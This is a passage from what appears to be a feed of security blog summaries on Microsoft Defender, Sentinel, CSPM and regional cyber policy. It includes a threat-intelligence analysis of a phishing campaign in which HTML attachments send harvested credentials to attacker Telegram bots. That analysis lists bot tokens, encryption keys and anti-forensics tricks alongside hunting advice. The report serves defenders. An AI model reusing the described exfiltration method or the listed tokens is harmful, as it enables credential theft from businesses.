management profile. Customizing the macOS Login Experience Platform SSO allows administrators to push Login Window Text and Show Full Name settings from Intune, enabling a personalized and informative login experience for users. These settings help display the user\u2019s full name and custom messages during sign-in, improving clarity and branding. Best Practices Assign Platform SSO policies during device enrollment for a seamless experience. Ensure password policies in Intune and Entra ID are aligned. Use Secure Enclave for most users; Smart Card for compliance scenarios. Regularly review group memberships and issuer assignments for certificate-based authentication. Document all scoped policies for compliance and troubleshooting. Conclusion Microsoft Platform SSO for macOS is a game-changer for organizations seeking secure, passwordless authentication across devices and applications. By leveraging Entra ID credentials, Touch ID, smart cards, and passkeys, IT teams can deliver a modern, seamless, and secure experience for users while maintaining compliance and reducing operational overhead.

      "title": "Detecting and Alerting on MDE Sensor Health Transitions Using KQL and Logic Apps",
      "summary": "Introduction Maintaining the health of Microsoft Defender for Endpoint (MDE) sensors is essential for ensuring continuous security visibility across your virtual machine (VM) infrastructure. When a sensor transitions from an \"Active\" to an \"Inactive\" state, it indicates a loss of telemetry from that device and potentially creating blind spots in your security posture. To proactively address this risk, it's important to detect these transitions promptly and alert your security team for timely remediation. This guide walks you through a practical approach to automate this process using a Kusto Query Language (KQL) script to identify sensor health state changes, and an Azure Logic App to trigger email alerts. By the end, you'll have a fully functional, automated monitoring solution that enhances your security operations with minimal manual effort. Why Monitoring MDE Sensor Health Transitions is Important Ensures Continuous Security Visibility MDE sensors provide critical telemetry data from endpoints. If a sensor becomes inactive, that device stops reporting, creating a blind spot in your security monitoring. Prevents Delayed Threat Detection Inactive sensors can delay the identification of malicious activity, giving attackers more time to operate undetected within your environment. Supports Effective Incident Response Without telemetry, incident investigations become harder and slower, reducing your ability to respond quickly and accurately to threats. Identifies Root Causes Early Monitoring transitions helps uncover underlying issues such as service disruptions, misconfigurations, or agent failures that may otherwise go unnoticed. Closes Security Gaps Proactively Early detection of inactive sensors allows teams to take corrective action before adversaries exploit the lapse in coverage. Enables Automation and Scalability Using KQL and Logic Apps automates the detection and alerting process, reducing manual effort and ensuring consistent monitoring across large environments. Improves Operational Efficiency Automated alerts reduce the need for manual checks, freeing up security teams to focus on higher-priority tasks. Strengthens Overall Security Posture Proactive monitoring and fast remediation contribute to a more resilient and secure infrastructure. Prerequisites MDE Enabled : Defender for Endpoint must be active and reporting on all relevant devices. Stream DeviceInfo table (from Defender XDR connector) in Microsoft Sentinel\u2019s workspace : Required to run KQL queries and manage alerts. Log Analytics Workspace : To run the KQL query. Azure Subscription : Needed to create and manage Logic Apps. Permissions : Sufficient RBAC access to Logic Apps, Log Analytics, and email connectors. Email Connector Setup : Outlook, SendGrid, or similar must be configured in Logic Apps. Basic Knowledge : Familiarity with KQL and Logic App workflows is helpful. High-level summary of the Logic Apps flow for monitoring MDE sensor health transitions : Trigger: Recurrence The Logic App starts on a scheduled basis (e.g., weekly or daily or hourly) using a recurrence trigger. Action: Run KQL Query Executes a Kusto Query against the Log Analytics workspace to detect devices where the MDE sensor transitioned from Active to Inactive in the last 7 days. Condition (Optional): Check for Results Optionally checks if the query returned any results to avoid sending empty alerts. Action: Send Email Notification If results are found, an email is sent to the security team with details of the affected devices using dynamic content from the query output. Logic Apps Flow KQL Query to Detect Sensor Transitions Use the following KQL query in Microsoft Defender XDR or Microsoft Sentinel to identify VMs where the sensor health state changed from Active to Inactive in the last 7 days: let LookbackPeriod = 7d; let NeverActiveDevice = DeviceInfo | where TimeGenerated > ago(LookbackPeriod) | where OnboardingStatus == \"Onboarded\" | project DeviceName, DeviceId, TimeGenerated, SensorHealthState | summarize make_set(SensorHealthState) by DeviceId | where not(set_has_element(set_SensorHealthState, \"Active\")) | lookup kind=inner (DeviceInfo | project DeviceName, DeviceId, TimeGenerated, SensorHealthState) on DeviceId | summarize arg_max(TimeGenerated, *) by DeviceId; let PreviousActiveDevices = DeviceInfo | project DeviceName, DeviceId, TimeGenerated, SensorHealthState, OnboardingStatus | where TimeGenerated > ago(LookbackPeriod) | summarize arg_max(TimeGenerated, *) by DeviceId, SensorHealthState | sort by DeviceId asc, TimeGenerated asc | serialize | extend PrevState = prev(SensorHealthState) | extend PrevState_deviceId = prev(DeviceId) | where DeviceId == PrevState_deviceId | where PrevState == \"Active\" and SensorHealthState != \"Active\" | extend DaysInactive = datetime_diff('day', now(), TimeGenerated); union PreviousActiveDevices, NeverActiveDevice | project-reorder TimeGenerated, DeviceId, DeviceName, PrevState, SensorHealthState, DaysInactive | extend DaysInactive = iff(isnotempty(DaysInactive), tostring(DaysInactive), strcat(\"Not Active in \", toint(LookbackPeriod/1d), \" days\")) This KQL query does the following: Detects devices whose sensors have stopped functioning (changed from Active to Inactive) in the past 7 days. Provides the first time this happened for each affected device. It also tells you how long each device has been inactive. Sample Email for reference How This Helps the Security Team Maintains Endpoint Visibility Detects when devices stop reporting telemetry, helping prevent blind spots in threat detection. Enables Proactive Threat Management Identifies sensor health issues before they become security incidents, allowing early intervention. Reduces Manual Monitoring Effort Automates the detection and alerting process, freeing up analysts to focus on higher-priority tasks. Improves Incident Response Readiness Ensures all endpoints are actively monitored, which is critical for timely and accurate incident investigations. Supports Compliance and Audit Readiness Demonstrates continuous monitoring and control over endpoint health, which is often required for regulatory compliance. Prioritizes Remediation Efforts Provides a clear list of affected devices, helping teams focus on the most recent or longest inactive endpoints. Integrates with Existing Workflows Can be extended to trigger ticketing systems, remediation scripts, or SIEM alerts, enhancing operational efficiency. Conclusion By combining KQL analytics with Azure Logic Apps, you can automate the detection and notification of sensor health issues in your VM fleet, ensuring continuous security coverage and rapid response to potential risks.",

      "title": "Multi-Brand themed Phishing Campaign Harvests Credentials via Telegram Bot API",
      "summary": "Cyble Research and Intelligence Labs (CRIL) have uncovered a widespread phishing campaign targeting multiple brands to steal credentials. Attackers distribute HTML attachments through email, successfully bypassing conventional security checks by not using suspicious URLs or hosting on external servers. The embedded HTML files run JavaScript that steals user credentials and sends them directly to attacker-controlled Telegram bots. The infection chain, outlined in Figure 1, showcases the stages of the attack. Figure 1: Campaign Overview Technical findings In this campaign, the adversary used an HTML file in the email as an attachment (RFC-compliant filename, such as RFQ_4460-INQUIRY.HTML) or as an archive. The HTML contains embedded JavaScript that accepts credentials on a fake Adobe login UI and posts them to the Telegram Bot API using a bot token and chat ID. The social lure used is a standard procurement/advice flow: an unsolicited request for quotation (RFQ) or invoice, which asks the recipient to open the attached document and \"sign in to view.\" (see Figure 2) Figure 2: Email Sharing Quotation PDF as an attachment, which is an HTML file The malicious file is a self-contained HTML page. It loads a blurred background invoice image and renders a centered login modal. No external hosting is required for the initial file; the HTML itself is the attachment. (see Figure 3) Figure 3: Adobe Themed login request with blurred image as background Credential capture flow: The victim opens the HTML attachment either in a web browser or in a PDF viewer capable of rendering HTML (some email clients enable opening attachments in a browser sandbox). The page shows a simulated Adobe sign-in form featuring email and password fields. On form submission, the page executes JavaScript that reads the field values and constructs a message payload. The script performs an HTTP POST to https://api.telegram.org/bot /sendMessage with chat_id and text fields containing the harvested credentials. The script then displays an error or \"invalid login\" message to avoid suspicion and prevent the user from attempting to log in again immediately. An excerpt of the exfiltration activity is shown in Figure 4. Figure 4: Telegram Bot Exfiltration Function Infrastructure Harvested credentials are transmitted directly to Telegram via the Bot API using hard-coded bot tokens and chat IDs embedded in the JavaScript of multiple samples. We analysed two representative samples that revealed the technical sophistication: Sample 1 Implements CryptoJS AES encryption for obfuscation (key: 8525965283890, iv: 4842043763) Harvests Email Address and Password, captures IP Address and user-agent, followed by exfiltration to Telegram Uses a dual-capture mechanism, forcing the victim to enter passwords twice, flashing wrong credential entered pop-up Integrates jQuery and external IP services ( api.ipify.org , http://ip-api.com ) to capture IP Address of the victims Redirects to legitimate adobe.com after harvesting the credentials Sample 2 The sample used a native Fetch API for cleaner implementation Displays \"The login is invalid\" to force the victims to make multiple credential input attempts Anti-forensics implementation blocks F12, Ctrl+U/S/C/A/X, Ctrl+Shift+I, right-click context menu, text selection (selectstart), and drag events. This leads to the prevention of victims and analysts from inspecting code, viewing source, copying content, or extracting assets. Meanwhile, the sendData() function exfiltrates email and password credentials to the Telegram Bot API (api.telegram.org/bot) via a POST request with a chat_id parameter, thereby bypassing traditional server-based C2 infrastructure. (see Figure 5) Figure 5: Anti-forensics Implementation to disable key combinations and functions Both samples share core functionality as shown in Figure 6. Figure 6: Telegram Exfiltration Function Telegram Bot Intelligence: An analysis of the campaign infrastructure uncovers a decentralized network of Telegram bots operated by multiple threat actors . Multiple active bot tokens were identified and confirmed in the ecosystem, each showcasing distinct, or in some cases, unique operational behavior. Bot Naming Conventions: garclogtools_bot, v8one_bot, thatboi_bot, dollsman_bot, davhapbot, clockwise47_bot Operator Profiles: Recipients include accounts with usernames like Rharfel, joedollar23telegram, Shorelight, coded404, marie_jane_01 Infrastructure Reuse: Bot token 7447553175:AAF2ifSM0-b7OiF-E4ZzqeDVthDALq-IexQ appears across multiple FedEx-themed samples, bot token 8155473646:AAEZzrw4q_ZZws1J8mJOcqFix9bAnFYeFlo observed across multiple Adobe and WeTransfer-themed samples. Scale & actor behaviour: Recent research conducted over the past month has identified many distinct HTML samples in circulation, suggesting broad reuse or automation. The templates and user interface components are consistent, including Adobe-style branding, blurred backgrounds on invoices, and centered elements modals, indicating the use of a toolkit or an automated generator. (see Figure 7) Figure 7: Usage of the same blurred image as background across multiple themed targets Geographic targeting Based on our threat intelligence analysis, the campaign primarily targets organizations across Central and Eastern Europe, with heavy concentration in the Czech Republic, Slovakia, Hungary, and Germany. The attackers distribute phishing emails posing as legitimate customers or business partners, requesting quotations or invoice confirmations. This regional focus is evident through targeted recipient domains belonging to local enterprises, distributors, government-linked entities, and hospitality firms that routinely process RFQs and supplier communications. Identified targeted industries include: Agriculture & Livestock Automotive Construction Consumer Goods Education Energy & Utilities Government & LEA Hospitality IT & ITES Manufacturing Media & Entertainment Professional Services Retail Telecommunications Technology Brand Impersonation Strategy The threat actors employ a sophisticated multi-brand approach tailored to regional preferences and business contexts. The brands leveraged by this campaign are as follows Global Brands (see Figure 8) Adobe (PDF/Document viewers) Microsoft (Excel, Outlook, Generic login) WeTransfer (File sharing) DocuSign (Electronic Digital Signature Platform) Figure 8: Global Technology Themed Brands Logistics/Shipping brands (see Figure 9) FedEx (international shipping) DHL (regional and international delivery) Figure 9: Logistics and Transportation Themed Brands Regional Service brands (see Figure 10) Telekom Deutschland/T-Mobile (German telecommunications) Roundcube (open-source webmail popular in Europe) Generic corporate portals customized per region Figure 10: Regional and Generic Themed Brands The campaign is likely designed to mimic common B2B communication in the sectors mentioned above. For Central European targets, the threat actor employs RFQ-style subject lines and procurement terminology. For broader audiences, they emphasize themes like document sharing and shipping notifications. This dual strategy, which merges regional business email styles with globally recognized brand impersonation, enhances success rates across diverse organizational cultures and security awareness levels. The modular template system enables quick deployment of new brand variants, suggesting that additional brands not listed could also be in circulation. The presence of German-language Telekom variants and Spanish-language sales department targeting shows the campaign's ability to tailor branding and language for specific regional markets. Campaign Evolution The technical variations between samples indicate ongoing development: Obfuscation progression: From plain JavaScript to AES encryption Anti-analysis enhancement: Addition of keyboard/mouse event blocking UI sophistication: Evolution from basic forms to polished, brand-authentic interfaces API modernization: Migration from jQuery $.ajax to native Fetch API Language expansion: English-only to multi-language support, including German, Korean, and Spanish In addition to this, we also identified the following: Conditional Execution: Telegram exfiltration only triggers upon actual credential entry, avoiding detection in automated sandboxes CDN Abuse: Leverages legitimate services (CloudFront, Cloudflare) to blend with normal traffic Domain Masquerading: References to trusted domains enhance legitimacy Conclusion A sophisticated credential-harvesting attack that is also scalable poses a potent threat. This campaign attempts to circumvent traditional security measures by using HTML attachments. Impersonating trusted brands, targeting specific audiences, and using Telegram for data exfiltration pose a low-cost yet high-impact threat to organizations worldwide. As obfuscation techniques and anti-analysis tactics evolve, SOCs' measures show ongoing development and improvement. Organizations should prioritize deploying HTML attachment controls and blocking the Telegram API as key components of their security strategy, while also enhancing overall email security to provide long-term protection. The scale of this operation, with multiple samples of different themes across different industries and multiple active bots, suggests a significant ongoing compromise of business credentials. Security teams should conduct retroactive threat hunts for the identified indicators and assume potential account compromises for any users who may have interacted with these attachments. Our Recommendations: For end users: Do not open unsolicited HTML attachments. If you must view an attachment, open it in a secure, sandboxed environment or convert it to PDF using a trusted service. Treat any prompt asking to re-enter credentials on top of an attachment/document with caution. For SOCs/Defenders: Hunt for api.telegram.org POST activity from clients that wouldn\u2019t normally call the Telegram Bot API. Monitor connections to third-party services, including api.ipify.org, ip-api.com, image conversion/sharing services (e.g., pngtoico.io, imgur.com), and fake login domains. Add content inspection for attachments: flag HTML attachments containing fetch (or XMLHttpRequest that reference telegram.org or other public C2 endpoints. Block or proxy direct traffic to the Telegram Bot API for endpoints that should not require it. Where blocking is not possible, inspect payloads for potential credentials. Implement attachment handling policies: block or sandbox .html attachments. Treat .html/.htm /.shtml attachments as high-risk file types requiring additional scrutiny. Implement content inspection for all HTML-based attachments before delivery to end users.

      "summary": "Dear Community, Today is the day: Our new agentless connector for Microsoft Sentinel Solution for SAP applications is Generally Available now! Fully onboarded to SAP\u2019s official Business Accelerator Hub and ready for prime time wherever your SAP systems are waiting \u2013 on-premises, hyperscalers, RISE, or GROW \u2013 to be protected. Let\u2019s hear from an agentless customer: \u201c With the Microsoft Sentinel Solution for SAP and its new agentless connector, we accelerated deployment across our SAP landscape without the complexity of containerized agents. This streamlined approach elevated our SOC\u2019s visibility into SAP security events, strengthened our compliance posture, and enabled faster, more informed incident response \u201d SOC Specialist, North American aviation company Use the video below to kick off your own agentless deployment today. #Kudos to the amazing mvigilante\u200b for showing us around the new connector! But we didn\u2019t stop there! Security is being reengineered for the AI era - moving from static, rule-based controls to platform-driven, machine-speed defence that anticipates threats before they strike. Attackers think in graphs - Microsoft does too. Schematic of the kill chain from human entry point on email through endpoints, identity, apps to data including SAP systems We\u2019re bringing relationship-aware context to Microsoft Security - so defenders and AI can see connections, understand the impact of a potential compromise (blast radius), and act faster across pre-breach and post-breach scenarios including SAP systems - your crown jewels. See it in action in below phishing-compromise which lead to an SAP login bypassing MFA with followed operating-system activities on the SAP host downloading trojan software. Enjoy this clickable experience for more details on the scenario. Attack Graph in Microsoft Defender: Shows how a phishing compromise escalated to an SAP MFA bypass, highlighting cross-domain correlation. The Sentinel Solution for SAP has AI-first in mind and directly integrates with our security platform on the Defender portal for enterprise-wide signal correlation, Security Copilot reasoning, and Sentinel Data Lake usage. Schematic on Microsoft Security Suite enabled for SAP through Sentinel for SAP solution Your real-time SAP detections operate on the Analytics tier for instant results and threat hunting, while the same SAP logs get mirrored to the lake for cost-efficient long-term storage (up to 12 years). Access that data for compliance reporting or historic analysis through KQL jobs on the lake. No more \u2013 yeah, I have the data stored somewhere to tick the audit report check box \u2013 but be able to query and use your SAP telemetry in long term storage at scale. Learn more here . Findings from the Agentless Connector preview During our preview we learned that majority of customers immediately profit from the far smoother onboarding experience compared to the Docker-based approach. Deployment efforts and time to first SAP log arrival in Sentinel went from days and weeks to hours. \u26a0\ufe0f Deprecation notice for containerized data connector agent \u26a0\ufe0f The containerised SAP data connector will be deprecated on 30 September 2026 . This change aligns with the discontinuation of the SAP RFC SDK , SAP's strategic integration roadmap, and customer demand for simpler integration. Migrate to the new agentless connector for simplified onboarding and compliance with SAP\u2019s roadmap. All new deployments starting October 31, 2025, will only have the new agentless connector option, and existing customers should plan their migration using the guidance on Microsoft Learn . It will be billed at the same price as the containerized agent, ensuring no cost impact for customers. Note \ud83d\udccc : To support transition for those of you on the Docker-based data connector, we have enhanced our built-in KQL functions for SAP to work across data sources for hybrid and parallel execution. Spotlight on new Features Inspired by the feedback of early adopters we are shipping two of the most requested new capabilities with GA right away.

      "title": "Australia Strengthens Regional Cyber Partnerships to Bolster Security Across the Asia-Pacific",
      "summary": "Australia is using its collaborative approach to cybersecurity across the Asia-Pacific, with key leadership from Stephanie Crowe, Head of the Australian Signals Directorate\u2019s Australian Cyber Security Centre (ASD\u2019s ACSC), and Jessica Hunter, the nation\u2019s newly appointed Ambassador for Cyber Affairs and Critical Technology. Together, they are spearheading initiatives to enhance cyber resilience, share threat intelligence, and build technical capacity among regional partners through frameworks such as the Pacific Cyber Security Operations Network (PaCSON) and the Asia Pacific Computer Emergency Response Team (APCERT). A Collaborative Vision for Regional Cybersecurity Speaking on their shared mission, Crowe and Hunter outlined how their respective portfolios intersect to reinforce cybersecurity within the Asia-Pacific. \u201cHi, I\u2019m Stephanie Crowe, Head of the Australian Cyber Security Centre at the Australian Signals Directorate,\u201d Crowe began, introducing her role. \u201cAnd I\u2019m Jessica Hunter, Ambassador for Cyber Affairs and Critical Technology at the Department of Foreign Affairs and Trade,\u201d added Hunter. \u201cWe work together to strengthen cybersecurity within the Asia-Pacific region.\u201d Hunter explained that her role as Ambassador for Cyber Affairs and Critical Technology involves leading Australia\u2019s international engagement in cyberspace and advancing national interests in emerging technologies. \u201cI do this through building cyber capacity, uplifting crisis response practices, and increasing resilience across our region,\u201d she said. Crowe described how the ACSC provides technical expertise and operational support. \u201cThrough the Australian Cyber Security Centre, the ASD shares cyber threat intelligence and supports capacity-building activities in Australia and with our neighbours in the Asia-Pacific,\u201d she noted. Aligning with the Australian Cyber Security Strategy Both leaders denoted that their work underpins the Australian Cyber Security Strategy, which prioritizes international cooperation as a mechanism for strengthening collective resilience. \u201cInternational collaboration gives us the best opportunity to leverage capability, expertise, partnerships, and threat visibility,\u201d Crowe said. \u201cBy doing so, we can help our region uplift its cybersecurity and boost its capability.\u201d Hunter added that cyberspace \u201cis truly borderless,\u201d requiring nations to work closely across the Pacific and beyond to ensure shared protection. \u201cCyber and critical technology affect all aspects of international relations,\u201d she explained. \u201cThey underpin national security, the realization of human rights and freedoms, global economic prosperity, sustainable development, and international stability.\u201d The $83.5 Million Cyber Program Commitment Australia\u2019s efforts are supported through the Cyber and Critical Technology Cooperation Program, a federal initiative valued at $83.5 million. The program provides rapid assistance for digital incident response and long-term resilience building, particularly in Pacific and Southeast Asian nations. \u201cThis program reflects our commitment to supporting the resilience of our closest partners,\u201d Hunter said. \u201cIt delivers on SHIELD Six of the Australian Government\u2019s Cyber Security Strategy by strengthening international cooperation and preparedness.\u201d Strengthening Regional Networks: PaCSON and APCERT A major component of Australia\u2019s regional engagement is its leadership role within PaCSON and APCERT, two cornerstone networks facilitating operational collaboration across the Asia-Pacific. The Pacific Cyber Security Operations Network (PaCSON) unites cybersecurity and incident response experts from government agencies across the Pacific. It provides a structured way for countries to share information, coordinate incident responses, and develop consistent practices for managing cyber threats . Similarly, the Asia Pacific Computer Emergency Response Team (APCERT) connects cybersecurity teams throughout the wider region, promoting best practices and mutual support in the face of emerging digital risks. \u201cBy uplifting our cyber defences together, we are better positioned to respond collectively to cyber incidents,\u201d Crowe said. \u201cThis work strengthens Australia and places the region in a better position to face evolving cyber challenges.\u201d Information Sharing and Regional Resilience The ACSC uses intelligence gathered from incidents within Australia to inform its engagement with Pacific partners. This includes issuing alerts, publishing technical advisories, and sharing best-practice resources through the national platform cyber.gov.au, which provides materials in more than 25 languages. According to Crowe, this approach ensures that lessons learned domestically can directly benefit regional counterparts. \u201cThe ASD and ACSC\u2019s advice helps to inform discussions and negotiations with our partners around cybersecurity awareness and uplift,\u201d she said. Hunter underscored that such collaboration is essential in a rapidly evolving threat landscape. \u201cA complex and evolving threat environment means that we need each other,\u201d she stated. \u201cNo country can face these challenges alone.\u201d Both leaders reiterated that cooperation among like-minded nations is critical to maintaining global trust and accountability. \u201cWe continue to join with international partners to uphold international law and impose costs on malicious actors that make cyberspace less safe,\u201d Hunter said. \u201cCollectively, we can strengthen our nations and our region\u2019s cyber resilience by working together to share knowledge, resources, and best practices.\u201d References: https://www.cyber.gov.au/about-us/view-all-content/news/building-cyber-capability-and-resilience-across-the-asia-pacific-region https://vimeo.com/1134039082?fl=pl&fe=ti The post Australia Strengthens Regional Cyber Partnerships to Bolster Security Across the Asia-Pacific appeared first on Cyble .",

      "title": "Fast-Start Checklist for Microsoft Defender CSPM: From Enablement to Best Practices",
      "summary": "When it comes to securing your multicloud environment, Microsoft Defender Cloud Security Posture Management offers a powerful suite of agentless capabilities. This blog post walks through a fast-start checklist to help you enable and operationalize DCSPM effectively, covering Policy Configuration, RBAC, enablement, and snapshot expectations. In this article, we\u2019ll go step-by-step through the key actions needed to enable Microsoft Defender CSPM and start gaining visibility, context, and protection across your multicloud workloads: 1. Enable Defender CSPM Plan To get started: In Azure Portal \u2192 Defender for Cloud \u2192 Environment settings \u2192 Select subscription. Toggle Defender CSPM plan \u2192 On \u2192 Save. \u27a1\ufe0f Must be enabled at the subscription level. Not supported at resource or resource group level. \u27a1\ufe0f Subscription Owner role is required to fully activate advanced components like agentless scanning. Contributors or Security Admins may toggle plan but lack full access. Clarification Note: While the DCSPM plan itself can only be toggled at the subscription level, organizations can use Azure Policy to enforce CSPM enablement at management group scope. This ensures all existing and future subscriptions in that management group will have the plan enabled automatically. 2. Enable Key CSPM Components When the Defender CSPM plan is enabled at subscription level, you unlock a set of advanced posture capabilities that do not require agents. These features strengthen visibility, risk assessment, and prioritization across your multicloud environment. The examples below highlight some of the core capabilities available, but Defender CSPM includes additional features and continuous enhancements beyond this list. Agentless Machine Scanning What it does: Creates temporary, isolated disk snapshots of Azure VMs, AWS EC2, and GCP compute instances to identify vulnerabilities, exposed secrets, and missing EDR coverage. No performance impact. Example: An enterprise scans thousands of unmanaged servers without deploying agents, detecting unpatched software and secrets in clear text. Agentless Kubernetes Discovery What it does: Provides agentless discovery of Kubernetes clusters (AKS, EKS, GKE) and connected container registries. Surfaces misconfigurations and posture risks through CSPM. Important note: Vulnerability scanning of running containers is part of the Defender for Containers (CWPP plan), not DCSPM. DCSPM complements by identifying misconfigurations, risky exposures, and attack paths. Example: A DevOps team enables DCSPM and sees misconfigured public endpoints on AKS clusters. To extend protection, they also enable Defender for Containers for runtime vulnerability scanning. Sensitive Data Discovery (DSPM) What it does: Detects sensitive data (PII, financial records, health data, etc.) across storage, databases, and other services using Microsoft Purview classification and smart sampling. Example: A healthcare provider discovers unencrypted patient files in an Azure storage account, flagged as \u201cSensitive\u201d via Purview labels. Permissions Management (CIEM) What it does: Identifies excessive permissions and risky identity configurations across multicloud environments. Provides least privilege recommendations. Example: A user account with Contributor roles on multiple subscriptions is flagged as overly permissive, reducing risk of lateral movement in case of compromise. Cloud Security Explorer & Security Graph What it does: Security Graph maps relationships between assets, permissions, misconfigurations, and threats. Cloud Security Explorer provides query-based search on this graph. Example: A security analyst queries for all internet-facing VMs with exploitable CVEs connected to privileged accounts, identifying a potential attack path. Attack Path Analysis What it does: Automatically surfaces potential attack paths to critical assets and ranks them by business risk. Suggests concrete remediation steps to break the chain. Example: A financial institution detects a path from a public storage container \u2192 high-privilege identity \u2192 sensitive SQL database, and immediately closes the misconfigured endpoint. 7 . Business Risk Prioritization (AI-Powered) What it does: Uses contextual signals (exposure, sensitive data, exploitability) to prioritize security recommendations by business impact. Example: Instead of fixing all medium-severity CVEs, the system highlights one critical VM that stores sensitive payment data and is internet-exposed, driving focus on the highest-impact fix. Note: Defender CSPM includes additional capabilities not listed here. For the complete list, please visit this article . 3. Policy Configuration A. Built-in Policy for DCSPM Microsoft provides a built-in policy called \u201cMicrosoft Defender CSPM should be enabled\u201d which can be assigned at the subscription or management group level. The policy currently uses the AuditIfNotExists effect to identify subscriptions where the Defender CSPM plan is not yet enabled. This allows organizations to monitor compliance and ensure consistent coverage across their environment. Purpose : enforce that the Defender CSPM plan is consistently enabled across subscriptions without relying on manual configuration. Clarification Note: Azure Policy does not enable DCSPM \u201conce for the whole management group.\u201d Instead, it ensures that each subscription under that management group has the DCSPM plan activated individually. B. Microsoft Cloud Security Benchmark (MCSB) When Defender for Cloud is enabled, the Microsoft Cloud Security Benchmark is the default initiative applied. It provides a comprehensive set of security controls mapped to industry best practices. The initiative is delivered as an Azure Policy initiative and drives both recommendations and Secure Score calculations. C. Regulatory Standards and Custom Recommendations In addition to MCSB, organizations can assign additional regulatory compliance standards (e.g., ISO 27001, GDPR, PCI DSS). Defender CSPM also allows you to define custom security standards using: Azure Policy definitions, or KQL-based custom recommendations in Defender for Cloud. These custom standards integrate directly into the Regulatory Compliance dashboard. 4. Evaluation Process Once policies/initiatives are assigned, Defender for Cloud continuously assesses resources against them. Each recommendation includes: The security risk and description. The list of affected resources. Remediation guidance. Potential attack paths if relevant. These results are visible in the Recommendations page, and they may contribute to Secure Score . 5. Implementation Best Practices Deployment at scale \u2192 Apply policies at the management group level for consistent coverage across multiple subscriptions. Enforce consistency \u2192 Use \u201cMicrosoft Defender CSPM should be enabled\u201d policy with DeployIfNotExists . Add benchmarks \u2192 Start with MCSB, then layer regulatory standards (PCI, GDPR, etc.) as required by your environment. Customize if needed \u2192 Use KQL-based recommendations to capture organization-specific posture requirements. Note : For further guidelines on how to deploy at scale, visit this article . 6. RBAC Permissions Setup Ensuring the correct Role-Based Access Control (RBAC) assignments is essential for effective deployment and operation of Defender CSPM features. I. Role Requirements for Enabling DCSPM Components The Subscription Owner role is required to enable key DCSPM features, such as agentless scanning, Kubernetes discovery, and other posture components; as these require elevated permissions that lesser roles don't have. While a lower-level role like Security Admin or Contributor could toggle the CSPM plan, many components would not activate fully without Owner privileges. II. Contributor, Reader, and Security Roles for Operations To view resource security status in Defender for Cloud, including recommendations, inventory, and Secure Score, a user needs Owner, Contributor, or Reader role on the subscription or resource group. To modify a security policy, assign compliance-related settings, or act on recommendations, the user must have either Security Administrator or Owner role in the subscription. III. Managed Identities and DCSPM Agent Roles Defender for Cloud uses service principals (managed identities) to operate features like agentless scanning. These principals require specific permissions depending on the environment. For example: Defender CSPM for AWS uses a role named CspmMonitorAws with permissions scoped to resource reading. For agentless VM scanning (including snapshot creation), a managed identity like DefenderForCloud-AgentlessScanner is created with snapshot-related permissions. IV. RBAC Inheritance via Management Groups To scale securely, it\u2019s best to assign roles at the management group level. Roles assigned here automatically propagate to parent subscriptions, enabling uniform access control across environments. This eliminates the need to replicate the same role assignments subscription by subscription. 7. Snapshot & Sensitive Data Discovery Expectation I. Activation Sensitive Data Discovery (part of Data Security Posture Management \u2013 DSPM) is enabled automatically when the Defender CSPM plan or Defender for Storage plan is turned on. No agent is required; the capability is built into Defender CSPM. II. Timeframes for Discovery Initial results: Up to 24 hours after enabling DSPM for the first time. New Azure Storage accounts: Scanned within 24 hours of being created in an enabled subscription. AWS S3 / GCP Storage buckets: Discovery and first scan occur within 48 hours or less. Databases (Azure SQL, AWS RDS, GCP Cloud SQL): First scan may take up to 24 hours, with weekly rescans thereafter. III. Regional Processing & Data Privacy All scans run locally in the resource\u2019s region, no cross-region transfers of customer data. Only metadata is stored by Defender for Cloud (resource ID, bucket names, sensitivity labels, classification results). Actual data content is never stored or moved outside the customer\u2019s region. Note : For more information about data privacy in Defender for Cloud, visit this article . IV. Disk Snapshot Usage For certain environments (e.g., AWS RDS databases), Defender for Cloud uses the latest automated disk snapshot to perform scanning. Process : a secure, isolated copy is created \u2192 scanned in-region \u2192 then deleted after completion. This ensures zero performance impact on the production workload. V. Best Practices Set clear expectations with stakeholders: scanning results are not immediate, and timing may vary according to the size of the environment, allow at least ~24h for first results. Continuous monitoring: ideally you should visit Defender for Cloud dashboard daily, since some recommendations will have shorter freshness time (update interval). Monitor Regulatory Compliance dashboard: sensitive data findings feed into posture reports and recommendations. Combine with access reviews: align sensitive data locations with RBAC/CIEM insights to mitigate insider risk. Note : For more information about agentless machine scanning and disk snapshot, visit this article . 8. Monitoring, Recommendations & Secure Score I. Recommendations Freshness and Prioritization Defender for Cloud continuously assesses your resources against security standards (MCSB, regulatory, and custom standards), generating security recommendations that include remediation steps, affected resources, associated risk level, risk factors, and even potential attack paths. To rank the recommendations, Defender CSPM dynamically prioritizes issues based on risk factors like internet exposure, sensitive data access, and lateral movement potential, adding context-specific business impact. II. Secure Score Overview The Secure Score provides a single, aggregated numeric score to represent your cloud security posture. A higher score indicates fewer unresolved security issues. The Microsoft Cloud Security Benchmark (MCSB) controls are utilized to build recommendations that will directly influence the secure score. Only GA (non-preview) recommendations are considered for the secure score. Updates: Each recommendation has a different freshness interval, which means that secure score may get updated in different moments of the day Once freshness interval is reached, Secure Score is updated accordingly to reflect the latest resource compliance. III. Continuous Export & Trend Monitoring You can set up continuous export of security data (recommendations, alerts, secure score, compliance, attack paths) to external destinations like: Azure Log Analytics, Event Hubs, or a SIEM/SOAR solution. Export modes: Streaming \u2013 data sent as soon as updates occur. Snapshots \u2013 weekly captures of current data state. Note : For more information about Continuous Export, visit this article . IV. Tracking Secure Score Over Time Defender for Cloud includes built-in workbooks such as Secure Score Over Time, visualizing score trends, control breakdowns, and how remediation affects the score. These workbooks require continuous export of data (streaming and snapshots) to function. Note : Snapshots are exported weekly; there is a delay of at least one week before you can view time-based trends. Conclusion Microsoft Defender CSPM is more than a configuration; it\u2019s a strategic enabler for multicloud security posture. By following this fast-start checklist, organizations can: Accelerate onboarding with subscription-level enablement and Azure Policy enforcement.

      "title": "Operationalizing the Sentinel data lake: A Practitioner\u2019s Guide",
